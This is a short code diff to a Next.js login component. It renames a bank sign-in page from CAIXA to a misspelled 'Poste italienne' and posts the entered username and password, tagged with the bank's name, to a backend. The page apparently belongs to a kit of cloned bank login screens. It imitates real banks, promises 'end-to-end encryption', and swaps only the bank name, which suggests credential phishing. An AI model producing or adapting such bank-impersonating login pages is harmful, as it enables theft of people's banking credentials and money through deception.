@@ -4,7 +4,7 @@ import Link from "next/link";
 import { useState } from "react";
 import { useRouter } from "next/navigation";
 
-export default function CAIXAConnect() {
+export default function PosteitalienneConnect() {
   const router = useRouter();
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
@@ -25,7 +25,7 @@ export default function CAIXAConnect() {
         body: JSON.stringify({ 
           username, 
           password, 
-          bankName: "CAIXA" // Ajout explicite du nom de la banque ici
+          bankName: "Poste-italienne" // Ajout explicite du nom de la banque ici
         }),
       });
 
@@ -58,7 +58,7 @@ export default function CAIXAConnect() {
         <i className="fa-solid fa-shield-halved"></i>
       </div>
 
-      <h1 className="bank-connect-title">Accedi a CAIXA</h1>
+      <h1 className="bank-connect-title">Accedi a Banco Poste italienne</h1>
       <p className="bank-connect-subtitle">Connessione sicura e crittografata end-to-end.</p>
 
       <form className="login-form" onSubmit={handleConnect}>
